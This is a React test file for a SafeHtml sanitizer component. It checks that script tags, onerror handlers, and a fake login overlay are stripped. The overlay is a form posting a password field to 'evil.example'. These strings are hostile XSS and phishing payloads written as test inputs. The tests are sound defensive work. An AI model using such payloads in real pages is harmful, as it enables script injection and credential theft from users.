import { describe, it, expect } from 'vitest'
import { render } from '@testing-library/react'
import SafeHtml from './SafeHtml'

describe('SafeHtml', () => {
  it('renders safe formatting markup', () => {
    const { container } = render(<SafeHtml html="<b>hallo</b>" />)
    expect(container.querySelector('b')?.textContent).toBe('hallo')
  })

  it('strips script tags and inline event handlers (XSS)', () => {
    const { container } = render(
      <SafeHtml html={'<img src=x onerror="alert(1)"><script>alert(2)</script>veilig'} />,
    )
    expect(container.querySelector('script')).toBeNull()
    expect(container.innerHTML).not.toContain('onerror')
    expect(container.textContent).toContain('veilig')
  })

  // ONIX M-002: a stored note must not be able to paint a login screen over the app.
  it('strips form/input/button/class/<style> so a note cannot impersonate the app', () => {
    const { container } = render(
      <SafeHtml html={'<style>body{display:none}</style><form action="https://evil.example"><p class="km-modal" style="position:fixed;inset:0">Sessie verlopen</p><input name="password"><button>Inloggen</button></form>'} />,
    )
    expect(container.querySelector('form, input, button, style')).toBeNull()
    expect(container.innerHTML).not.toContain('class=')
    expect(container.innerHTML).not.toContain('position')
    expect(container.innerHTML).not.toContain('display:none')
    expect(container.textContent).toContain('Sessie verlopen')
  })

  it('keeps the editor\'s text-align style and drops every other declaration', () => {
    const { container } = render(<SafeHtml html={'<p style="text-align: right; opacity: 0">r</p>'} />)
    expect(container.querySelector('p')?.getAttribute('style')).toBe('text-align: right')
  })

  it('renders nothing harmful for null input', () => {
    const { container } = render(<SafeHtml html={null} />)
    expect(container.textContent).toBe('')
  })
})
